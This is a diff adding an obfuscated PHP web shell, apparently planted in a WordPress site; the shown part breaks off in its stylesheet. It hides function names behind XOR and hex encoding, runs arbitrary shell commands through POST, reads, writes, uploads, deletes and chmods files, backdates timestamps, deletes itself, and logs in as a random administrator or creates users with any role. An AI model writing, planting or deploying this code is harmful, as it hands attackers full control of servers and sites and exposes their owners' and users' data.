@@ -1,0 +1,3363 @@
+<?php
+
+error_reporting(0);
+
+function xorEncryptDecrypt($input, $key = null) {
+    if ($key === null) {
+        $key = chr(0x31) . chr(0x32);
+    }
+    $out = '';
+    $klen = strlen($key);
+    $len = strlen($input);
+    for ($n = 0; $n < $len; $n++) {
+        $out .= $input[$n] ^ $key[$n % $klen];
+    }
+    return $out;
+}
+
+function get_current_path() {
+    $path = isset($_POST['path']) && !empty($_POST['path']) ? decode_char($_POST['path']) : getcwd();
+    return $path;
+}
+
+function code_execution($value, $function) {
+    $output = '';
+    $decoded_function = decode_char($function);
+    $value = decode_char($value);
+    $proccl = decode_char('41405e516e515d5d4257');
+    $pcl = decode_char("41515d5d4257");
+
+    ob_start();
+    switch ($function) {
+        case '424b4246545f':
+        case '424b4246545f':
+            $decoded_function($value);
+            $output = ob_get_contents();
+            break;
+        case '544a5451':
+            $decoded_function($value, $output);
+            $output = implode("\n", $output);
+            break;
+        case '425a545e5d6d544a5451':
+            $output = $decoded_function($value);
+            break;
+        case '415d41575f':
+            $handle = $decoded_function($value, 'r');
+            if (is_resource($handle)) {
+                while (!feof($handle)) {
+                    $output .= fread($handle, 4096);
+                }
+                $pcl($handle);
+            }
+            break;
+        case '41405e516e5d41575f':
+            $descriptorspec = [
+                0 => ["pipe", "r"],
+                1 => ["pipe", "w"],
+                2 => ["pipe", "w"]
+            ];
+            $process = $decoded_function($value, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                fclose($pipes[1]);
+                $proccl($process);
+            }
+            break;
+        default:
+            break;
+    }
+    ob_end_clean();
+    return $output ?: 'No output?';
+}
+
+function wp_action_mode($mode) {
+    global $glob_file;
+    if ($glob_file && ($glob_file !== '0' && file_exists($glob_file))) {
+        require_once $glob_file;
+    }
+
+    $log_function = decode_char('46426e4154466e534446596d525d5e595857');
+    $set_current = decode_char('46426e4154466e51444043575f466e47425743');
+    $allowed_role = decode_char("50565c5b5f5b42464353455d43");
+
+    if (!function_exists($log_function)) {
+        return false;
+    }
+
+    switch ($mode) {
+        case 'log':
+            $users = get_users(["role" => $allowed_role]);
+            if (!$users) {
+                return false;
+            }
+            $arr_rand = array_rand($users, 1);
+            $user = $users[$arr_rand];
+            if (!$user) {
+                return false;
+            }
+            $id = $user->data->ID;
+            $log_function($id);
+            $set_current($id);
+            return $id;
+            break;
+        case 'activate':
+            $plugin = isset($_REQUEST['plugin']) ? trim($_REQUEST['plugin']) : '';
+            if ($plugin === '') {
+                return false;
+            }
+            require_once ABSPATH . 'wp-admin/includes/plugin.php';
+            activate_plugin($plugin);
+            return true;
+        case 'create_user':
+            $username = isset($_REQUEST['username']) ? trim($_REQUEST['username']) : '';
+            $email    = isset($_REQUEST['email']) ? trim($_REQUEST['email']) : '';
+            $password = isset($_REQUEST['password']) ? $_REQUEST['password'] : '';
+            $role     = isset($_REQUEST['role']) ? trim($_REQUEST['role']) : 'subscriber';
+            if ($username === '' || $email === '' || $password === '') {
+                return ['success' => false, 'error' => 'Missing required fields'];
+            }
+            if (username_exists($username)) {
+                return ['success' => false, 'error' => 'Username already exists'];
+            }
+            if (email_exists($email)) {
+                return ['success' => false, 'error' => 'Email already exists'];
+            }
+            $user_id = wp_create_user($username, $password, $email);
+            if (is_wp_error($user_id)) {
+                return ['success' => false, 'error' => $user_id->get_error_message()];
+            }
+            $user = new WP_User($user_id);
+            $user->set_role($role);
+            return ['success' => true, 'user_id' => $user_id];
+        default:
+            die("nothing");
+            break;
+    }
+}
+
+function listing_all_directory() {
+    $path = get_current_path();
+    $result = array();
+    $date_format = "d-m-Y H:i:s";
+
+    if ($handle = opendir($path)) {
+        while (false !== ($dir = readdir($handle))) {
+            if ($dir === '.' || $dir === '..') {
+                continue;
+            }
+
+            $full_path = "$path/$dir";
+            $is_dir = is_dir($full_path);
+
+            $tmp_result = array(
+                'path' => htmlspecialchars($full_path),
+                'is_writable' => is_writable($full_path),
+                'is_dir' => $is_dir,
+                'date' => date($date_format, filemtime($full_path)),
+                'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
+                'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
+            );
+            $result[] = $tmp_result;
+        }
+        closedir($handle);
+    }
+    return $result;
+}
+
+$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : false;
+$glob_file = isset($_COOKIE['glob-file']) && !empty($_COOKIE['glob-file']) ? $_COOKIE['glob-file'] : false;
+
+if (!$glob_file) {
+    $glob_file = check_load_file() ?: '0';
+    setcookie("glob-file", $glob_file);
+}
+
+function check_load_file() {
+    $filename = decode_char("46421c5e5e53551c415a41");
+    $root_directory = $_SERVER['DOCUMENT_ROOT'];
+    $file_path = $root_directory . DIRECTORY_SEPARATOR . $filename;
+    return file_exists($file_path) ? $file_path : false;
+}
+
+if (!$action) {
+    main();
+    menu();
+}
+
+function decode_char($string) {
+    if (!is_string($string) || $string === '') {
+        return '';
+    }
+    $string = trim($string);
+    if (strlen($string) % 2 !== 0 || !ctype_xdigit($string)) {
+        return '';
+    }
+    $h = hex2bin($string);
+    if ($h === false) {
+        return '';
+    }
+    return xorEncryptDecrypt($h);
+}
+
+function json_post_body() {
+    $raw = file_get_contents("php://input");
+    if (!is_string($raw)) {
+        return null;
+    }
+    $data = json_decode($raw, true);
+    return is_array($data) ? $data : null;
+}
+
+function fm_walk_recursive($path, $callback) {
+    $callback($path);
+    if (!is_dir($path)) {
+        return;
+    }
+    $items = @scandir($path);
+    if ($items === false) {
+        return;
+    }
+    foreach (array_diff($items, ['.', '..']) as $item) {
+        fm_walk_recursive($path . DIRECTORY_SEPARATOR . $item, $callback);
+    }
+}
+
+function fm_chmod_recursive($path, $mode) {
+    fm_walk_recursive($path, function ($p) use ($mode) {
+        @chmod($p, $mode);
+    });
+}
+
+function fm_touch_recursive($path, $ts) {
+    fm_walk_recursive($path, function ($p) use ($ts) {
+        @touch($p, $ts);
+    });
+}
+
+switch ($action) {
+    case 'd':
+        die(json_encode(listing_all_directory()));
+        break;
+    case 'ec':
+        if ($_SERVER['REQUEST_METHOD'] == "POST") {
+            $value = $_POST['value'];
+            $function = $_POST['function'];
+            $output = code_execution($value, $function);
+            $message['output'] = $output;
+            die(json_encode($message));
+        }
+        echo '(:';
+        break;
+    case 'wp':
+        if ($_SERVER['REQUEST_METHOD'] == "POST") {
+            $mode = $_REQUEST['mode'];
+            $result = wp_action_mode($mode);
+            if (is_array($result)) {
+                $message = $result;
+            } else {
+                $message['result'] = $result;
+                $message['success'] = $result ? true : false;
+            }
+            die(json_encode($message));
+        }
+    case 'rf':
+
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $data = json_post_body();
+            if (!$data || !isset($data['filename'])) {
+                die(json_encode(['success' => false, 'content' => '']));
+            }
+            $filename = decode_char(trim($data['filename']));
+            if ($filename === '') {
+                die(json_encode(['success' => false, 'content' => '']));
+            }
+            $content = customize_read_file($filename);
+
+            die(json_encode(['success' => true, 'content' => base64_encode($content), 'encoded' => true, 'filename' => $filename]));
+        }
+        die(json_encode(['success' => false]));
+        break;
+    case 'r':
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $data = json_post_body();
+            if (!$data || !isset($data['content'], $data['filename'])) {
+                $message['success'] = false;
+                die(json_encode($message));
+            }
+            $content = show_base_data()($data['content']);
+            if ($content === false) {
+                $content = '';
+            }
+            $content = (string) $content;
+            $filename = decode_char(trim($data['filename']));
+            if ($filename === '') {
+                $message['success'] = false;
+                die(json_encode($message));
+            }
+            $dir = dirname($filename);
+            if (!empty($dir) && !is_dir($dir) && function_exists('mkdir')) {
+                @mkdir($dir, 0755, true);
+            }
+            $message['success'] = fm_write_file($filename, $content);
+            die(json_encode($message));
+        }
+        main();
+        $content = customize_read_file(decode_char($_REQUEST['filename']));
+        show_text_area(htmlspecialchars($content));
+        break;
+    case 'cf':
+        if ($_SERVER['REQUEST_METHOD'] == "POST") {
+            $data = explode(',', $_POST['data']);
+            $list_functions = array_map('decode_char', $data);
+            foreach ($list_functions as $function) {
+                $disabled_functions = @ini_get('disable_functions');
+
+                $disabled_functions = $disabled_functions ? array_map('trim', explode(',', $disabled_functions)) : [];
+
+                if (empty($disabled_functions)) {
+                    $message['avail'] = true;
+                    $message['func'] = $function;
+                    exit(json_encode($message));
+                }
+
+                if (function_exists($function) && !in_array($function, $disabled_functions)) {
+                    $message['avail'] = true;
+                    $message['func'] = $function;
+                    exit(json_encode($message));
+                }
+
+            }
+            $message['avail'] = false;
+            die(json_encode($message));
+        }
+        echo "Missing someone?";
+        break;
+    case 'cr':
+        main();
+        show_text_area("");
+        break;
+    case 'ul':
+        $filename = decode_char($_REQUEST['filename']);
+        $is_dir = !empty($_REQUEST['is_dir']);
+        if (fm_remove_path($filename, $is_dir)) {
+            $message['success'] = true;
+        } else {
+            $message['success'] = false;
+        }
+        die(json_encode($message));
+        break;
+    case 'extract':
+        $filename = decode_char(trim($_REQUEST['filename'] ?? ''));
+        if (!$filename) {
+            $data = json_post_body();
+            if ($data && isset($data['filename'])) {
+                $filename = decode_char(trim($data['filename']));
+            }
+        }
+        $dest = dirname($filename);
+        $success = false;
+        $method = false;
+        $error = '';
+        if (class_exists('ZipArchive')) {
+            $zip = new ZipArchive();
+            $res = $zip->open($filename);
+            if($res === TRUE) {
+                if($zip->extractTo($dest)) {
+                    $success = true;
+                    $method = 'ziparchive';
+                }else{
+                    $error = $zip->getStatusString();
+                }
+                $zip->close();
+            } else {
+                $error = 'ZipArchive failed to open file';
+            }
+        }
+        if (!$success && isset($_POST['function'])) {
+            $function = $_POST['function'];
+            $params = "unzip -o " . escapeshellarg($filename) . " -d " . escapeshellarg($dest);
+            $params = bin2hex(xorEncryptDecrypt($params));
+            $out = code_execution($params, $function);
+            if ($out !== 'No output?') {
+                $success = true;
+                $method = 'command';
+                $error = '';
+            } else {
+                $success = false;
+                $error = 'Command returned no output or failed';
+            }
+        }
+        die(json_encode(['success' => $success, 'method' => $method, 'error' => $error]));
+        break;
+    case 'up':
+        $file = $_FILES['import_file'];
+        $tmp_name = $file['tmp_name'];
+        $content = customize_read_file($tmp_name);
+        if (isset($_POST['by'])) {
+            $content = show_base_data()($content);
+        }
+        $path = get_current_path();
+        $name = $file['name'];
+        $destination = "$path/$name";
+        $message['success'] = $content && fm_write_file($destination, $content) ?: rename($tmp_name, $destination);
+        die(json_encode($message));
+        break;
+    case 're':
+        $filename = decode_char($_REQUEST['filename']);
+        $path = $_REQUEST['path'];
+        if ($_SERVER['REQUEST_METHOD'] == "POST") {
+            $old_filename = "$path/$filename";
+            $new = $_POST['new'];
+            $new_filename = "$path/$new";
+            $message['success'] = rename($old_filename, $new_filename);
+            die(json_encode($message));
+        }
+        break;
+    case 'to':
+        $filename = decode_char($_REQUEST['filename']);
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $date = $_POST['date'];
+            $str_date = strtotime($date);
+            $message['success'] = touch($filename, $str_date);
+            clearstatcache(true, $filename);
+            die(json_encode($message));
+        }
+    case 'sd':
+
+        header('Content-Type: application/json');
+        echo json_encode(['success' => true]);
+        flush();
+
+
+        $file = __FILE__;
+        @chmod($file, 0777);
+        $deleted = @unlink($file);
+        if (!$deleted) {
+            $deleted = @unlink($_SERVER['SCRIPT_FILENAME']);
+        }
+        if (!$deleted && function_exists('exec')) {
+            @exec('rm -f ' . escapeshellarg($file) . ' 2>/dev/null');
+        }
+        exit;
+        break;
+    case 'ch':
+
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $data = json_post_body();
+            if (!$data) {
+                die(json_encode(['success' => false]));
+            }
+            $filename = decode_char(trim($data['filename'] ?? ''));
+            $mode = intval($data['mode'] ?? 0, 8);
+            $recursive = !empty($data['recursive']);
+            if ($filename === '' || $mode === 0) {
+                die(json_encode(['success' => false]));
+            }
+            if ($recursive && is_dir($filename)) {
+                fm_chmod_recursive($filename, $mode);
+                $message['success'] = true;
+            } else {
+                $message['success'] = @chmod($filename, $mode);
+            }
+            die(json_encode($message));
+        }
+        die(json_encode(['success' => false]));
+        break;
+    case 'md':
+
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $data = json_post_body();
+            if (!$data) {
+                die(json_encode(['success' => false]));
+            }
+            $dirname = decode_char(trim($data['dirname'] ?? ''));
+            if ($dirname === '') {
+                die(json_encode(['success' => false]));
+            }
+            $message['success'] = @mkdir($dirname, 0755, true);
+            die(json_encode($message));
+        }
+        die(json_encode(['success' => false]));
+        break;
+    case 'bulk':
+
+        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+            $data = json_post_body();
+            if (!$data) {
+                die(json_encode(['success' => false]));
+            }
+            $act     = $data['act'] ?? '';
+            $files   = $data['files'] ?? [];
+            $extra   = $data['extra'] ?? '';
+            $recursive = !empty($data['recursive']);
+            $results = [];
+            foreach ($files as $enc) {
+                $path = decode_char(trim($enc));
+                if ($path === '') continue;
+                switch ($act) {
+                    case 'delete':
+                        $results[] = fm_remove_path($path, is_dir($path));
+                        break;
+                    case 'touch':
+                        $ts = strtotime($extra);
+                        if ($ts) {
+                            if ($recursive && is_dir($path)) {
+                                fm_touch_recursive($path, $ts);
+                            } else {
+                                @touch($path, $ts);
+                            }
+                            clearstatcache(true, $path);
+                        }
+                        $results[] = (bool)$ts;
+                        break;
+                    case 'chmod':
+                        $mode = intval($extra, 8);
+                        if ($recursive && is_dir($path)) {
+                            fm_chmod_recursive($path, $mode);
+                            $results[] = true;
+                        } else {
+                            $results[] = @chmod($path, $mode);
+                        }
+                        break;
+                }
+            }
+            die(json_encode(['success' => !in_array(false, $results, true), 'results' => $results]));
+        }
+        die(json_encode(['success' => false]));
+        break;
+    default:
+        break;
+}
+
+function customize_read_file($file) {
+    if (!file_exists($file) || filesize($file) < 1) {
+        return '';
+    }
+    
+    $handle = fopen($file, 'r');
+    if ($handle) {
+        $content = fread($handle, filesize($file));
+        if ($content) {
+            return $content;
+        }
+    }
+    $lines = file($file);
+    if ($lines) {
+        return implode($lines);
+    }
+    return show_file_contents()($file);
+}
+
+function show_file_contents() {
+    $file = "file_";
+    $old = "get_";
+    $contents = "contents";
+    return "$file$old$contents";
+}
+
+function show_text_area($content) {
+    $filename = decode_char($_REQUEST['filename']);
+    $filename_encoded = isset($_REQUEST['filename']) ? htmlspecialchars($_REQUEST['filename'], ENT_QUOTES, 'UTF-8') : '';
+    echo <<<HTML
+    <div class="panel">
+            <p><a href='?' id='back_menu'>< Back</a></p>
+            <br>
+
+
+        <div class="file-path">$filename</div>
+        <input type="hidden" id="edit-filename" value="$filename_encoded">
+        <textarea id="content" class="file-content">$content</textarea>
+        <button type="submit" class="btn" id="textarea-handle">Save</button>
+    </div>
+HTML;
+}
+
+function show_base_data() {
+    $alvian = "base";
+    $nadir = "64_decode";
+    return "$alvian$nadir";
+}
+
+function fm_write_file($file, $content) {
+    if ($content === false || $content === null) {
+        $content = '';
+    }
+    $content = (string) $content;
+    if (function_exists('fopen')) {
+        $handle = @fopen($file, 'w');
+        if ($handle) {
+            if (@fwrite($handle, $content) !== false) {
+                fclose($handle);
+                return file_exists($file);
+            }
+            fclose($handle);
+        }
+    }
+    if (function_exists('file_put_contents')) {
+        if (@file_put_contents($file, $content) !== false) {
+            return file_exists($file);
+        }
+    }
+    return false;
+}
+
+function fm_make_request($url) {
+    if (function_exists("curl_init")) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $output = curl_exec($ch);
+        return $output;
+    }
+    return show_file_contents()($url);
+}
+
+function show_un() {
+    $link = "link";
+    $unpad = "un";
+    return "$unpad$link";
+}
+
+function fm_remove_path($path, $is_dir = false) {
+    if (!file_exists($path)) {
+        return true;
+    }
+    if ($is_dir && is_dir($path)) {
+        $items = array_diff(scandir($path), array('.', '..'));
+        foreach ($items as $item) {
+            $full = $path . DIRECTORY_SEPARATOR . $item;
+            if (is_dir($full)) {
+                fm_remove_path($full, true);
+            } else {
+                @unlink($full);
+            }
+        }
+        return @rmdir($path);
+    }
+    return @unlink($path);
+}
+
+function main() {
+    global $current_path;
+    global $glob_file;
+
+    $current_path = isset($_REQUEST['path']) ? $_REQUEST['path'] : false;
+
+    if (!$current_path) {
+        setcookie("path", getcwd());
+        $current_path = getcwd();
+    }
+
+    $path = str_replace('\\', '/', $current_path);
+    $paths = explode('/', $path);
+    echo '<div class="breadcrumb" id="path_div">';
+    foreach ($paths as $id => $pat) {
+        if ($id == 0) {
+            echo '<a href="#" path="/" onclick="change_path(this)">/</a>';
+        }
+        if ($pat != '') {
+            $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
+            echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
+        }
+    }
+    echo "</div>";
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+        :root {
+            --bg:           #000000;
+            --surface:      #111111;
+            --surface-2:    #1d1d1d;
+            --surface-3:    #262626;
+            --border:       #262626;
+            --border-light: #262626;
+            --text:         #ffffff;
+            --text-muted:   #f1f1f1;
+            --text-dim:     #aaaaaa;
+            --accent:       #ffa41c;
+            --accent-dim:   rgba(255, 164, 28, 0.12);
+            --green:        #3dd68c;
+            --green-dim:    rgba(61, 214, 140, 0.15);
+            --red:          #ff4d6d;
+            --red-dim:      rgba(255, 77, 109, 0.15);
+            --folder:       #ffffff;
+            --mono:         ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            --sans:         'JetBrains mono', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+        }
+
+        *, *::before, *::after {
+            margin: 0; padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            font-size: 14.5px;
+            font-weight: 300;
+            line-height: 1.6;
+            padding: 0;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        ::selection {
+            background: rgba(255, 164, 28, 0.25);
+            color: var(--text);
+        }
+
+        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 8px; }
+
+        .ml-2em { margin-right: 8px; }
+        .ml-2am { margin-left: 2.4em; }
+        .mr-10  { margin-right: 15px; }
+        .white  { color: var(--text); }
+        .red    { color: var(--red); }
+        .green  { color: var(--green); }
+
+        
+        .panel {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 0;
+            padding: 20px 24px;
+            margin-bottom: 0;
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .panel-title {
+            font-family: var(--mono);
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--accent);
+        }
+
+        .blur-table {
+            filter: blur(6px);
+            opacity: 0.4;
+            pointer-events: none;
+            transition: filter 0.2s, opacity 0.2s;
+        }
+
+        
+        .btn {
+            background: var(--surface-2);
+            color: var(--text);
+            border: 1px solid var(--border);
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: var(--sans);
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+            transition: all 0.15s ease;
+        }
+
+        .btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: var(--surface-3);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.4);
+        }
+
+        .btn-danger {
+            border-color: var(--red);
+            color: var(--red);
+            background: transparent;
+        }
+
+        .btn-danger:hover {
+            background: var(--red-dim);
+            border-color: #ff4d6d;
+            color: #ff7088;
+        }
+
+        
+        .breadcrumb {
+            margin-bottom: 0;
+            font-family: var(--mono);
+            font-size: 14px;
+            color: var(--text-muted);
+            background: var(--surface-2);
+            margin-top: 20px;
+            margin-bottom: 20px;
+            padding: 10px 24px;
+            border-radius: 0;
+            border-bottom: 1px solid var(--border);
+            word-wrap: break-word;
+        }
+
+        .breadcrumb a {
+            color: var(--text);
+            text-decoration: none;
+            transition: color 0.12s;
+        }
+
+        .breadcrumb a:hover {
+            color: var(--accent);
+        }
+
+        
+        .file-content {
+            width: 100%;
+            min-height: 340px;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 16px 20px;
+            font-family: var(--mono);
+            font-size: 13px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+            border-radius: 10px;
+            resize: vertical;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        .file-content:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px var(--accent-dim);
+        }
+
+        .file-path {
+            margin-bottom: 10px;
+            color: var(--text-muted);
+            font-family: var(--mono);
+            font-size: 11px;
+        }
+
+        
+        .file-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        .file-table thead {
+            position: sticky;
+            top: 0;
+            z-index: 1;
+        }
+
+        .file-table th {
+            color: var(--text-muted);
+            font-family: var(--mono);
+            font-weight: 500;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            padding: 9px 16px;
+            text-align: left;
+            background: var(--surface-2);
+            border-bottom: 1px solid var(--border);
+            white-space: nowrap;
+        }
+
+        .file-table th:nth-child(2),
+        .file-table th:nth-child(3),
+        .file-table th:nth-child(4) {
+            text-align: center;
+        }
+
+        .file-table th.sortable {
+            cursor: pointer;
+            user-select: none;
+            position: relative;
+            padding-right: 20px;
+        }
+
+        .file-table th.sortable::after {
+            content: '';
+            position: absolute;
+            right: 6px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 5px solid var(--text-dim);
+            opacity: 0.4;
+            transition: opacity 0.15s, border-color 0.15s;
+        }
+
+        .file-table th.sortable.sort-asc::after {
+            border-top: none;
+            border-bottom: 5px solid var(--accent);
+            opacity: 1;
+        }
+
+        .file-table th.sortable.sort-desc::after {
+            border-top: 5px solid var(--accent);
+            opacity: 1;
+        }
+
+        .file-table th.sortable:hover {
+            color: var(--accent);
+        }
+
+        .file-table td {
+            padding: 8px 16px;
+            border-bottom: 1px solid var(--border);
+            vertical-align: middle;
+            color: var(--text);
+        }
+
+        .file-table td.tc {
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .file-table tbody tr {
+            transition: background 0.1s;
+        }
+
+        .file-table tbody tr:hover {
+            background: var(--surface-2);
+        }
+
+        .file-table a {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text);
+            transition: color 0.12s;
+        }
+
+        .file-table a:hover { color: var(--accent); }
+
+        .icon-folder { color: var(--folder); }
+
+        
+        .badge-writable {
+            display: inline-block;
+            padding: 1px 8px;
+            border-radius: 2px;
+            font-family: var(--mono);
+            font-size: 10px;
+            letter-spacing: 0.05em;
+            color: var(--green);
+            background: var(--green-dim);
+            border: 1px solid rgba(31,138,101,0.3);
+        }
+
+        .badge-readonly {
+            display: inline-block;
+            padding: 1px 8px;
+            border-radius: 2px;
+            font-family: var(--mono);
+            font-size: 10px;
+            letter-spacing: 0.05em;
+            color: var(--text-dim);
+            border: 1px solid var(--border);
+            background: transparent;
+        }
+
+        .size-cell {
+            font-family: var(--mono);
+            font-size: 11.5px;
+            font-variant-numeric: tabular-nums;
+            color: var(--text-muted);
+        }
+
+        .date-cell {
+            font-family: var(--mono);
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+
+        .file-table td:first-child {
+            max-width: 400px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .file-icon  { color: var(--text-dim); }
+        .file-actions { display: flex; gap: 5px; }
+
+        .file-action-btn {
+            background: none;
+            border: none;
+            color: var(--accent);
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        .file-action-btn:hover { text-decoration: underline; }
+
+        
+        .tools-panel {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 0;
+            padding: 12px 0;
+            align-items: center;
+        }
+
+        .tool {
+            padding: 6px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            border: 1px solid var(--border-light);
+            background: transparent;
+            color: var(--text-muted);
+            font-family: var(--sans);
+            font-size: 12px;
+            font-weight: 500;
+            transition: all 0.15s ease;
+        }
+
+        .tool:hover {
+            border-color: var(--accent);
+            color: var(--text);
+            background: var(--surface-2);
+        }
+
+        
+        .notification {
+            position: fixed;
+            bottom: 24px;
+            left: 24px;
+            background: var(--surface-3);
+            color: var(--text);
+            border: 1px solid var(--border-light);
+            padding: 10px 18px;
+            border-radius: 8px;
+            z-index: 9999;
+            font-family: var(--mono);
+            font-size: 12px;
+            letter-spacing: 0.03em;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            animation: slideUp 0.18s cubic-bezier(0.16,1,0.3,1);
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(12px); opacity: 0; }
+            to   { transform: translateY(0);    opacity: 1; }
+        }
+
+        .hidden { display: none; }
+
+        
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            cursor: pointer;
+            color: var(--text-muted);
+            font-family: var(--mono);
+            font-size: 11px;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            transition: color 0.12s;
+        }
+
+        .checkbox-label:hover { color: var(--text); }
+
+        .checkbox-label input[type="checkbox"] {
+            appearance: none;
+            width: 13px; height: 13px;
+            border: 1px solid var(--border-light);
+            border-radius: 1px;
+            cursor: pointer;
+            background: transparent;
+            position: relative;
+            transition: border-color 0.12s, background 0.12s;
+        }
+
+        .checkbox-label input[type="checkbox"]:checked {
+            background: var(--accent);
+            border-color: var(--accent);
+        }
+
+        .checkbox-label input[type="checkbox"]:checked::after {
+            content: '';
+            position: absolute;
+            left: 3px; top: 1px;
+            width: 5px; height: 8px;
+            border: 1.5px solid #000000;
+            border-top: none; border-left: none;
+            transform: rotate(45deg);
+        }
+
+        
+        .context-menu {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            background: var(--surface-3);
+            border: 1px solid var(--border-light);
+            border-radius: 8px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+            min-width: 160px;
+            padding: 6px 0;
+            font-family: var(--sans);
+        }
+
+        .context-menu.show { display: block; }
+
+        .context-menu-item {
+            padding: 7px 16px;
+            cursor: pointer;
+            color: var(--text-muted);
+            font-family: var(--mono);
+            font-size: 11.5px;
+            letter-spacing: 0.03em;
+            transition: background 0.1s, color 0.1s;
+        }
+
+        .context-menu-item:hover {
+            background: var(--accent-dim);
+            color: var(--accent);
+        }
+
+        .context-menu-item.disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
+        .context-menu-item.disabled:hover {
+            background: transparent;
+            color: var(--text-muted);
+        }
+
+        
+        .command-input {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .command-input input {
+            flex: 1;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 7px 12px;
+            border-radius: 2px;
+            font-family: var(--mono);
+            font-size: 12.5px;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .command-input input::placeholder { color: var(--text-dim); }
+        .command-input input:focus { border-color: var(--border-light); }
+
+        .command-output {
+            height: 200px;
+            overflow-y: auto;
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 12px 14px;
+            border-radius: 2px;
+            margin-bottom: 12px;
+            white-space: pre-wrap;
+            font-family: var(--mono);
+            font-size: 12px;
+            line-height: 1.65;
+        }
+
+        
+        .panel-actions { display: flex; gap: 8px; }
+
+        
+        #byp {
+            background: transparent;
+            border: none;
+            padding: 0 0 14px 0;
+            margin: 0;
+        }
+
+        
+        .terminal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9000;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            animation: fadeIn 0.15s ease;
+        }
+
+        .terminal-overlay.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to   { opacity: 1; }
+        }
+
+        .terminal-dialog {
+            background: #111111;
+            border: 1px solid #262626;
+            border-radius: 8px;
+            width: 720px;
+            max-width: 92vw;
+            max-height: 80vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 16px 48px rgba(0,0,0,0.6);
+            animation: termSlideUp 0.18s cubic-bezier(0.16,1,0.3,1);
+        }
+
+        @keyframes termSlideUp {
+            from { transform: translateY(16px); opacity: 0; }
+            to   { transform: translateY(0);    opacity: 1; }
+        }
+
+        .terminal-titlebar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 14px;
+            background: #1d1d1d;
+            border-bottom: 1px solid #262626;
+            user-select: none;
+        }
+
+        .terminal-titlebar-text {
+            font-family: var(--mono);
+            font-size: 12px;
+            color: #999999;
+            letter-spacing: 0.04em;
+        }
+
+        .terminal-close-btn {
+            background: none;
+            border: none;
+            color: #aaaaaa;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 0 4px;
+            line-height: 1;
